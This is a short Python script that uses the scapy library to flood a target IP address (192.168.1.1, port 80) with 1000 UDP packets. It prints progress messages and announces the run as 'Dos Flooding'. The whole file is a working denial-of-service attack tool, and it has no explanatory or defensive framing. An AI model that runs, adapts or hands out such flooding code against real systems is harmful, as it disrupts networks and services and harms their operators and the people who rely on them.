from scapy.all import IP,UDP,send
import time

target_ip = "192.168.1.1"
target_port = 80
packet_count = 1000

print(f"Starting Dos Flooding on {target_ip}:{target_port}")

for i in range(packet_count):
    packet = IP(dst=target_ip)/ UDP(dport=target_port)
    send(packet,verbose=False)
    print(f"Packet {i+1} is sent")

print("Dos Flooding is Completed")
